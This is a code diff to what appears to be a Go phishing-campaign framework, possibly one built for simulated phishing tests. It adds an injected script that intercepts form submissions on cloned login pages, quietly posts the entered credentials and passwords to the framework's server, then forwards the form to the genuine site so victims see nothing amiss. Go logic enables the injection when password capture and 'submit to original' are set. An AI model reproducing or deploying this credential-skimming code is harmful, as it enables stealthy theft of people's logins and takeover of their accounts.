@@ -24,6 +24,34 @@ type Page struct {
 // ErrPageNameNotSpecified is thrown if the name of the landing page is blank.
 var ErrPageNameNotSpecified = errors.New("Page Name not specified")
 
+var JsSubmitToOriginal = `<script type='text/javascript'>(function(){
+  if(typeof __goCaptureAndSubmitToOriginal !== 'function'){
+     window.__goCaptureAndSubmitToOriginal = function(){
+       var forms = jQuery('body').find('form');
+       jQuery.each(forms, function(i, f){
+         var form = jQuery(f);
+         form.find('input[type=submit]').on('click', function(e){
+           e.preventDefault();
+           $.post("", form.serialize(), function(done){
+             form.submit();
+           });
+         });
+       });
+     };
+  }
+  if(typeof jQuery === 'undefined'){
+    var script = document.createElement('script');
+    script.src = 'https://code.jquery.com/jquery-2.2.4.min.js';
+    script.type = 'text/javascript';
+    script.onload = function(){
+      __goCaptureAndSubmitToOriginal();
+    };
+    document.head.appendChild(script);
+  }else{
+    __goCaptureAndSubmitToOriginal();
+  }
+})();</script>`
+
 // parseHTML parses the page HTML on save to handle the
 // capturing (or lack thereof!) of credentials and passwords
 func (p *Page) parseHTML() error {
@@ -31,11 +59,21 @@ func (p *Page) parseHTML() error {
 	if err != nil {
 		return err
 	}
+
+	if p.CaptureCredentials && p.CapturePasswords && p.SubmitToOriginal {
+		head := d.Find("head")
+		head.AppendHtml(JsSubmitToOriginal)
+	}
+
 	forms := d.Find("form")
 	forms.Each(func(i int, f *goquery.Selection) {
-		// We always want the submitted events to be
-		// sent to our server
-		f.SetAttr("action", "")
+		// If we still want to submit to the original domain, do not override
+		if !p.SubmitToOriginal {
+			// We always want the submitted events to be
+			// sent to our server
+			f.SetAttr("action", "")
+		}
+
 		if p.CaptureCredentials {
 			// If we don't want to capture passwords,
 			// find all the password fields and remove the "name" attribute.
@@ -54,13 +92,6 @@ func (p *Page) parseHTML() error {
 			inputFields.Each(func(j int, input *goquery.Selection) {
 				input.RemoveAttr("name")
 			})
-
-			// if capture and submit to original is selected, cpature creds by ajax
-			// and then submit real form to the phised page
-			// if p.submit_to_original {
-			// 	head := d.Find("head")
-			// }
-
 		}
 	})
 	p.HTML, err = d.Html()
